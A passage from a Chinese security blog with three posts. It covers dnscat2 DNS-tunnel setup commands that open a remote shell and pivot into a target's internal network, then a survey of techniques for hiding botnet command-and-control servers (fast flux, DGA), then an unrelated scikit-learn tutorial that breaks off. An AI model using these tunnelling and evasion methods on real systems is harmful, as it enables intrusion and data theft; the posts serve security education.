<p>client如果是windows，就直接在这个网址（<a href="https://downloads.skullsecurity.org/dnscat2/" target="_blank" rel="noopener">https://downloads.skullsecurity.org/dnscat2/</a> ）下载win32.zip的dnascat2后解压就可以了</p>
<p>至此，环境都部署完毕，就可以开始连接隧道了。我测试时使用ubuntu系统的公网服务器做server，用本机的kali做client。</p>
<p>我们首先在server端开启隧道：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby ./dnscat2.rb dns.uuzdaisuki.com --no-cache</span><br></pre></td></tr></table></figure></p>
<p>将这个域名改成自己刚刚设置的ns记录的子域名，–no-cache代表不进行缓存</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns03.png?raw=true" alt=""></p>
<p>然后将上面产生的这串secret复制下来，要在client中使用。</p>
<p>client中运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./dnscat --dns domain=dns.uuzdaisuki.com --secret=xxxxxxxxxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure></p>
<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns04.png?raw=true" alt=""></p>
<p>domain参数是我们ns记录的子域名，secret参数是刚才server中生成的密文，我们传输信息的安全程度就取决于它。windows中参数使用略有不同，自己查看help文件即可。</p>
<p>client运行得到上面结果之后，server中也会出现一个new window create，后面是它的sessionID，我们现在就可以在server中通过这个session连接控制client了</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns05.png?raw=true" alt=""></p>
<p>使用如下代码可以进去这个session<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session -i 1</span><br></pre></td></tr></table></figure></p>
<p>然后使用help可以查看可以使用的命令：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns06.png?raw=true" alt=""></p>
<p>比如我们要使用一个shell控制，可以输入shell获取一个新的window，sessionID为2，然后再session -i 2切入。</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns07.png?raw=true" alt=""></p>
<p>之后就可以使用命令交互：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns08.png?raw=true" alt=""></p>
<p>此时我们也可以通过dns隧道来访问目标系统可以访问的网络，类似于ssl，在dnscat2中用listen命令实现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">listen [lhost:]lport rhost:rport</span><br></pre></td></tr></table></figure></p>
<p>比如我们要通过对方网络访问百度，那就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">listen 1234 www.baidu.com:80</span><br></pre></td></tr></table></figure></p>
<p>访问localhost:1234就可以通过对方网络访问百度了，不过这个功能一般是用来访问内网才可以访问的网站，探测对方内网之后将baidu替换成对方内网的站就可以了。</p>
<p>我们dns tunnel建立好之后，主要是为了绕过防火墙偷数据，使用help学习其他功能传输即可。</p>
<h3 id="抓包观察"><a href="#抓包观察" class="headerlink" title="抓包观察"></a>抓包观察</h3><p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns09.png?raw=true" alt=""></p>
<p>在客户端中抓包可以看到，有很多DNS的TXT、CNAME、MX的查询方法，这是因为Dnscat2 利用的DNS请求类型默认是TXT,CNAME,MX随机混合使用，不过我们可以在运行时通过参数自定义来更改请求方式。</p>
<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>用于dns tunnel的工具除了dnscat2(灵活)，还有dns2tcp(Kali直接集成了这个工具)、iodine(速度快)等，各有特点，我们可以根据实际情况来选取。</p>
<p>还有要注意的一点是使用了dns tunnel只是绕过了一些传统防火墙，如果对方的防御系统具备一些基于机器学习或深度学习的检测策略，或者对方的安全人员比较熟悉这种偷数据的方式，还是会被发现的。</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/03/C-C控制服务思路浅析/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/08/03/C-C控制服务思路浅析/" itemprop="url">
                  C&C控制服务思路浅析
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-03T10:48:49+08:00">
                2018-08-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
                    <span itemprop="name">渗透测试</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/08/03/C-C控制服务思路浅析/" class="leancloud_visitors" data-flag-title="C&C控制服务思路浅析">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在前面的博客中写过一次用python实现的后门 <a href="http://next.uuzdaisuki.com/2018/06/17/%E5%9F%BA%E4%BA%8Epython%E7%9A%84%E7%9B%B4%E8%BF%9Eshell%E5%92%8C%E5%8F%8D%E5%B0%84shell/" target="_blank" rel="noopener">http://next.uuzdaisuki.com/2018/06/17/%E5%9F%BA%E4%BA%8Epython%E7%9A%84%E7%9B%B4%E8%BF%9Eshell%E5%92%8C%E5%8F%8D%E5%B0%84shell/</a> 里面的代码用最简单的例子来实现了远程控制。</p>
<p>但是当我们想要构建大规模僵尸网络的时候，就会发现这类简单的后门很不方便，我们不可能有时间一个一个手动的进行控制。而且大部分的肉鸡ip都是一直在变动而且无法直接访问的，所以远控中基本都使用反弹式通信，反弹式通信需要肉鸡每隔一段时间对我们的控制机发送心跳包，但是我们自己的电脑，ip很多情况也都是一直在变动的，我们很难保证自己拥有一个不变的公网ip。为了避免这些问题，我们就需要一台能够集中统一控制僵尸网络的主机，也就是C&amp;C服务器。</p>
<ul>
<li>C&amp;C服务器：command and control server(命令与控制服务器)。一般是指挥控制僵尸网络的主控服务器，用来和每个肉鸡进行通信并指挥它们的攻击行为。</li>
</ul>
<p>当然我这篇并不打算写一个简单的主控脚本和远控脚本，然后把它部署到公网服务器中，毕竟这些步骤只需要稍微改一下最开始那个链接里面脚本的代码就可以了。这篇我想要对通过各种方法部署和隐藏C&amp;C服务器的方法做一个总结。</p>
<h2 id="0x01-通过IP地址访问C-amp-C服务器"><a href="#0x01-通过IP地址访问C-amp-C服务器" class="headerlink" title="0x01 通过IP地址访问C&amp;C服务器"></a>0x01 通过IP地址访问C&amp;C服务器</h2><p>最简单的方法就是租用一台云服务器，将服务器ip直接写远控脚本中反弹的ip中，然后所有肉鸡都会每隔一段时间与这个ip进行一次通信，我们也就可以在服务器上用脚本控制僵尸网络发动攻击。</p>
<p>但是由于ip地址是直接写死在远控脚本或远控程序中的，如果对方捕获了远控脚本或者远控程序，进行简单的二进制逆向扫描就可以得到我们服务器ip地址，并且对方机器经常访问同一个ip也会增加被发现的几率。一旦被发现，对方直接将ip加入黑名单，并且将ip提交给我们购买云服务器的提供商，服务器被封禁就会使远控全部失效。</p>
<p>优点：简单易实现、耗费小(仅服务器开销)。</p>
<p>缺点：极易被发现、很容易大规模失效。</p>
<h2 id="0x02-通过域名访问C-amp-C服务器"><a href="#0x02-通过域名访问C-amp-C服务器" class="headerlink" title="0x02 通过域名访问C&amp;C服务器"></a>0x02 通过域名访问C&amp;C服务器</h2><p>通过域名再指向服务器比起直接指向服务器只是将反弹ip改为反弹的域名。如果注册一些较正常的域名并且做一个伪装的主页，被发现的几率就会降低，而且直接二进制扫描不会被发现。但是逆向程序或着搭建蜜罐进行动态测试，很容易就能追踪到这些域名，将域名丢给运营商的黑名单就会造成大规模的远控失效。</p>
<p>不过比起仅通过ip地址访问这种方式要多花去安全人员的一点时间，如果在这个时间内达成目的，也算是成功了。</p>
<p>优点：简单易实现、耗费小(服务器和域名开销)。</p>
<p>缺点：易被发现、很容易大规模失效。</p>
<h2 id="0x03-Fast-flux"><a href="#0x03-Fast-flux" class="headerlink" title="0x03 Fast flux"></a>0x03 Fast flux</h2><p>如果一个域名很容易被蜜罐捕获的话，我们可以将几十个域名分散的写在代码中，这些域名都指向同一台服务器的ip地址，程序会对域名轮换访问，然后提供一个较短的ttl使域名对ip的解析记录也会不断的更换。</p>
<p>这样被捕获某一部分域名添加黑名单并没有办法阻止恶意软件。而且因为ip解析记录一直变更也无法直接举报服务器，所以需要安全人员很高的逆向能力将恶意域名全部找出来。</p>
<p>不过这个方式有两个缺陷，一个是将捕获的一部分恶意域名的ip解析历史记录进行统计、数据分析，也会很快找到服务器的ip地址。另一个缺陷是域名记录的TTL相比正常的过短，容易被抓住特征。</p>
<p>优点：被发现后较难快速处理、被屏蔽一部分域名不会造成僵尸网络失效。</p>
<p>缺点：实现需要足够的代码混淆和隐藏能力、耗费较大(多个域名的开销)、一旦服务器ip被发现仍然会大规模失效。</p>
<h2 id="0x04-Double-flux、Triple-flux"><a href="#0x04-Double-flux、Triple-flux" class="headerlink" title="0x04 Double flux、Triple flux"></a>0x04 Double flux、Triple flux</h2><p>既然Fast flux容易被捕获一部分恶意域名进行数据分析而发现ip，那域名能增加ip也能增加，Double flux就是在一般的fast flux过程中除了轮换域名，也让ip可以轮换，如果我们有M个域名和N个ip这样就产生了M*N组的C&amp;C通道，还有更多的干扰项。</p>
<p>Triple flux在Double flux的基础上，增加一层Name Server通过CNAME方式解析，这样域名有可能指向ip也有可能指向别的域名，然后再指向ip，这些Name Server也会定期轮换，就增加了更多C&amp;C通道和干扰项。</p>
<p>这两种方法都增加了安全人员分析的难度，而且不会因为个别的服务器或域名被封禁导致僵尸网络失效，但是仍然存在着和普通Fast flux一样的问题，那就是因为域名到ip的解析一直轮换导致TTL需要设置很短，很容易被抓取特征而捕获。</p>
<p>优点：被发现后较难快速处理、被屏蔽一部分域名、封禁一部分ip都不会造成僵尸网络失效。</p>
<p>缺点：实现需要足够的代码混淆和隐藏能力、耗费很大(多个域名和多个服务器的开销)。</p>
<h2 id="0x05-使用论坛等作为C-amp-C服务器"><a href="#0x05-使用论坛等作为C-amp-C服务器" class="headerlink" title="0x05 使用论坛等作为C&amp;C服务器"></a>0x05 使用论坛等作为C&amp;C服务器</h2><p>自己架设服务器很容易被封禁，然后丢失僵尸网络的控制权，有的攻击者想到一个绝佳的办法：通过在一些论坛的冷门区域发一些C&amp;C控制指令，然后让恶意软件通过爬虫在访问这些论坛的时候获取指令，最开始主要是在twitter上进行C&amp;C控制，这种情况一开始很让安全人员头疼，因为访问这些论坛的请求本就和正常数据包差不多很难被发现，而且就算发现了，总不能把twitter的域名或者服务器添加很名单吧，这会影响网络的正常使用。后来发现了这种情况可以进行举报，从而封禁对应的账号。</p>
<p>优点：耗费低、不是特别容易被发现。</p>
<p>缺点：被发现后会被直接封禁账号损失僵尸网络。</p>
<h2 id="0x06-使用随机域名生成算法"><a href="#0x06-使用随机域名生成算法" class="headerlink" title="0x06 使用随机域名生成算法"></a>0x06 使用随机域名生成算法</h2><p>比起注册一堆域名耗费巨大，更好的办法是使用DGA(Domain Generation Algorithm)算法，这种C&amp;C控制方法的思路就是控制一个确定的随机域名生成算法，用约定好的随机数种子生成大量的随机域名（如当天日期时间），恶意软件对这些域名全部进行访问，我们只需要按照规律注册其中个别有可能的域名就可以进行控制。</p>
<p>这个方法的重点在于没有任何确定的域名写入到恶意软件里，即使逆向也找不到真正的域名，而且逆向出这个随机算法的难度非常大。并且生成的随机域名数量十分巨大对方无法得知究竟我们注册了哪个域名。由于随机算法(提前设定好)和随机种子(可以根据时间等生成)都是我们不需要通信就可以得知的信息，我们任何时候都可以知道该注册那种类型的域名可以进行控制。</p>
<p>除非源码泄露，安全人员要逆向出DGA算法是非常困难的，也很难用黑名单的方式屏蔽掉所有的域名。目前应对这种C&amp;C的方法一般是利用机器学习算法去判定域名的随机性，然后筛选出有可能是恶意域名的域名进行分析找出ip，或者利用机器学习算法智能的屏蔽对这些域名的访问。</p>
<p>天下没有免费的午餐，这种方式比起前面的方法也有一个缺陷，产生的随机域名过多且访问频率有限的时候，想通过C&amp;C服务器进行控制就需要等待较长的时间，所以在攻击时灵活度不足。强行减少等待的时间就得增加访问频率，就会增加被发现的概率。</p>
<p>优点：非常难被封禁、很难通过逆向的方式解决掉恶意域名、耗费低(只需一台服务器和几个域名)。</p>
<p>缺点：控制延迟很高、灵活度不足。</p>
<h2 id="0x07-使用变形DGA算法"><a href="#0x07-使用变形DGA算法" class="headerlink" title="0x07 使用变形DGA算法"></a>0x07 使用变形DGA算法</h2><p>这个方法是为了对抗检测域名随机性的机器学习算法而产生的，大体步骤和上面相似，不同处是比起使用域名随机算法，添加一些英文单词作为字典构成域名，就比较接近正常的网页，不会被普通的机器学习算法检测出来。</p>
<p>还是那句话，天下没有免费的午餐，添加字典减少了随机性，必然会缩小产生域名的数量，很快就会用完所有的域名。</p>
<p>优点：非常难被封禁、很难通过逆向的方式解决掉恶意域名、耗费低(只需一台服务器和几个域名)。</p>
<p>缺点：控制延迟很高、灵活度不足。</p>
<h2 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h2><p>C&amp;C的设计与防御是目前攻防中很重要的一部分，围绕着C&amp;C，双方在攻防博弈中各显神通，完美的结合了机器学习、数据科学等知识，是非常有学习和研究价值的。</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/01/python-scikit-learn学习-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/08/01/python-scikit-learn学习-2/" itemprop="url">
                  python-scikit learn学习(2)
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-01T17:06:38+08:00">
                2018-08-01
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/python/" itemprop="url" rel="index">
                    <span itemprop="name">python</span>
                  </a>
                </span>

                
                
                  ， 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/python/机器学习/" itemprop="url" rel="index">
                    <span itemprop="name">机器学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/08/01/python-scikit-learn学习-2/" class="leancloud_visitors" data-flag-title="python-scikit learn学习(2)">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-scikit-learn"><a href="#0x00-scikit-learn" class="headerlink" title="0x00 scikit-learn"></a>0x00 scikit-learn</h2><p>Scikit-learn（以前称为scikits.learn）是一个用于Python编程语言的免费开源机器学习库。它广泛地支持各种分类、聚类以及回归分析方法比如支持向量机、随机森林、DBSCAN等等，由于其强大的功能、优异的拓展性以及易用性，目前受到了很多数据科学从业者的欢迎，也是业界相当著名的一个开源项目之一。</p>
<h2 id="0x01-模型属性与功能"><a href="#0x01-模型属性与功能" class="headerlink" title="0x01 模型属性与功能"></a>0x01 模型属性与功能</h2><p>sklearn库中所有机器学习的模型对象中都有一些属性与功能，假设模型对象名为mod，那么就可以这样表示mod模型的一些属性与功能：</p>
<ul>
<li>mod.coef_  x前的系数</li>
<li>mod.intercept_  截距</li>
<li>mod.predict() 预测</li>
<li>mod.get_params() 定义的参数</li>
<li>mod.score(data_x,data_y) 用data_x做预测，用data_y做比较给模型打分</li>
</ul>
<p>我们以上一篇中的线性回归模型为例查看一下这些属性：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from sklearn import datasets</span><br><span class="line">from sklearn.linear_model import LinearRegression</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">example_x,example_y = datasets.make_regression(n_samples=100,n_features=2,n_targets=1,noise=3)</span><br><span class="line"></span><br><span class="line">lr = LinearRegression()</span><br><span class="line">lr.fit(example_x,example_y)</span><br><span class="line"></span><br><span class="line">print(lr.coef_)</span><br><span class="line">print(lr.intercept_)</span><br><span class="line">print(lr.predict(example_x[:5,:]))</span><br><span class="line">print(lr.get_params())</span><br><span class="line">print(lr.score(example_x,example_y))</span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn07.png?raw=true" alt=""></p>
<p>可以从输出中看到：</p>
<ul>
<li>lr.coef_输出一个list代表每一种特征前的系数</li>
<li>lr.intercept_输出截距</li>
<li>lr.predict()方法可以输入样本进行预测</li>
<li>lr.get_params()方法可以输出模型的配置信息</li>
<li>lr.score()方法通过对比预测的数据和原始标签对模型打分</li>
</ul>
<h2 id="0x02-标准化"><a href="#0x02-标准化" class="headerlink" title="0x02 标准化"></a>0x02 标准化</h2><p>在训练模型时，某些特征可能会在不同的样本中相差特别大，有一些异常大或者异常小的数据会对模型训练结果造成较大误差，并且数据分布很分散也会影响训练结果，所以一般在训练之前，我们都会对特征数值进行标准化。</p>
<p>基本的标准化流程是去除每个特征的平均值来转换数据使其居中，然后通过将非常数特征除以它们的标准差来对其进行缩放。</p>
<p>在scikit-learn库中，有用于预处理数据的模块sklearn.preprocessing，其中scale方法可以快速简便的实现上述标准化操作。用一段代码来尝试一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from sklearn import preprocessing</span><br><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x_train = np.array([[1, -100, 0.03],</span><br><span class="line">              [-1, 500, -0.02],</span><br><span class="line">              [0.2, 200, 0.04]], dtype=np.float64)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(preprocessing.scale(x_train))</span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn08.png?raw=true" alt=""></p>
<p>可以看到，数据都被标准化到很接近的位置，这样就更利于学习器训练了。</p>
<p>具体能产生多大的影响，我们可以通过datasets产生一组数据，对比直接训练和标准化之后训练的精度：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from sklearn import preprocessing</span><br><span class="line">from sklearn.model_selection import train_test_split</span><br><span class="line">from sklearn.datasets.samples_generator import make_classification</span><br><span class="line">from sklearn.svm import SVC</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line"></span><br><span class="line">X, y = make_classification(</span><br><span class="line">    n_samples=300, n_features=2,</span><br><span class="line">    n_redundant=0, n_informative=2,</span><br><span class="line">    n_clusters_per_class=1,scale=100)</span><br><span class="line"></span><br><span class="line">#可视化数据</span><br><span class="line">plt.scatter(X[:, 0], X[:, 1], c=y)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line">X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3)</span><br><span class="line">clf = SVC()</span><br><span class="line">clf.fit(X_train, y_train)</span><br><span class="line">print(clf.score(X_test, y_test))</span><br><span class="line"></span><br><span class="line">X = preprocessing.scale(X)</span><br><span class="line">X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3)</span><br><span class="line">clf = SVC()</span><br><span class="line">clf.fit(X_train, y_train)</span><br><span class="line">print(clf.score(X_test, y_test))</span><br></pre></td></tr></table></figure></p>
<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn09.png?raw=true" alt=""></p>
<p>在这个程序中使用datasets中的make_classification方法产生拥有两个特征值的分类数据，然后就可以将两个特征值分别放在横轴和纵轴来观察数据分布</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn10.png?raw=true" alt=""></p>
<p>接着对比直接训练和标准化之后训练的精度，发现前后差距非常大。</p>
<p>标准化还有一种常用的方式那就是将特征取值规定到一个范围（默认0-1），只需将最开始代码中标准化函数改为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">min_max_scaler = preprocessing.MinMaxScaler()</span><br><span class="line">X_MinMax = min_max_scaler.fit_transform(x_train)</span><br></pre></td></tr></table></figure></p>
<h2 id="0x03-交叉验证"><a href="#0x03-交叉验证" class="headerlink" title="0x03 交叉验证"></a>0x03 交叉验证</h2><p>之前在机器学习的模型评估方法里面学过几种模型验证的方法，其中也提到了，学习器训练完成后仍然在训练集种测试实际上是一种错误的方法，因为这个学习器在自身的训练集上很容易得到一个很高的分数，但是对新样本无法预测出任何有用的信息，这种情况被称为过拟合。</p>
<p>所以为了避免这种情况，我们一般在验证的时候会将样本分为训练集和测试集，在之前的博客（ <a href="http://next.uuzdaisuki.com/2018/07/24/机器学习-5-——模型评估方法/" target="_blank" rel="noopener">http://next.uuzdaisuki.com/2018/07/24/机器学习-5-——模型评估方法/</a> ）介绍了留数法、交叉验证法、自助法这几种方法来分割训练集与测试集。</p>
<p>前面的程序我们大多使用train_test_split方法将样本分为两部分，也就是留数法，那么这里就使用sklearn实现交叉验证法。</p>
<p>交叉验证法需要用到sklearn的cross_val_score模块，我们就在刚才svm分类算法的基础上写出交叉验证：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from sklearn import preprocessing</span><br><span class="line">from sklearn.model_selection import train_test_split</span><br><span class="line">from sklearn.datasets.samples_generator import make_classification</span><br><span class="line">from sklearn.svm import SVC</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">from sklearn.model_selection import cross_val_score</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#生成具有2种属性的300笔数据</span><br><span class="line">X, y = make_classification(</span><br><span class="line">    n_samples=300, n_features=2,</span><br><span class="line">    n_redundant=0, n_informative=2,</span><br><span class="line">    n_clusters_per_class=1,scale=100)</span><br><span class="line"></span><br><span class="line">#可视化数据</span><br><span class="line">plt.scatter(X[:, 0], X[:, 1], c=y)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line">X = preprocessing.scale(X)</span><br><span class="line">clf = SVC()</span><br><span class="line"></span><br><span class="line">scores=cross_val_score(clf,X,y,cv=10,scoring=&apos;accuracy&apos;)</span><br><span class="line"></span><br><span class="line">print(scores)</span><br><span class="line">print(scores.mean())</span><br></pre></td></tr></table></figure></p>
<p>数据分布如图：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn11.png?raw=true" alt=""></p>
<p>输出十组分别的分数和平均分数：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn12.png?raw=true" alt=""></p>
<p>交叉验证因为抽取的测试集更随机化且全部抽到，所以平均后的评估得分更令人信服。</p>
<p>其中cross_val_score种的clf是模型，X样本特征，y是样本标签，cv是交叉验证的分组数量，scoring参数是计分指标，可以根据实际情况在官方文档选取合适的计分指标：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn13.png?raw=true" alt=""></p>
<h2 id="0x04-模型保存"><a href="#0x04-模型保存" class="headerlink" title="0x04 模型保存"></a>0x04 模型保存</h2><p>在实际的机器学习运用中，训练用的样本量是十分大的，也就是说训练一个模型需要的时间开销非常大，我们要使用一个训练好的模型，每次都去重新训练一遍是不现实的，所以在训练好之后我们需要保存模型。</p>
<p>我们常用的存取模型方法有如下两种</p>
<h3 id="使用pickle保存模型"><a href="#使用pickle保存模型" class="headerlink" title="使用pickle保存模型"></a>使用pickle保存模型</h3><p>第一种方法是使用pickle库保存和读取模型，以上一篇博客中的k近邻算法为例：</p>
<p>保存模型：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from sklearn import datasets</span><br><span class="line">from sklearn.neighbors import KNeighborsClassifier</span><br><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">iris = datasets.load_iris()</span><br><span class="line">iris_x = iris.data</span><br><span class="line">iris_y = iris.target</span><br><span class="line"></span><br><span class="line">knn = KNeighborsClassifier()</span><br><span class="line">knn.fit(iris_x,iris_y)</span><br><span class="line"></span><br><span class="line">file = open(&quot;model/knn.pickle&quot;,&quot;wb&quot;)</span><br><span class="line">pickle.dump(knn,file)</span><br></pre></td></tr></table></figure></p>
<p>然后当前程序目录中model子目录下就会产生一个knn.pickle的文件。</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn14.png?raw=true" alt=""></p>
<p>读取模型：</p>
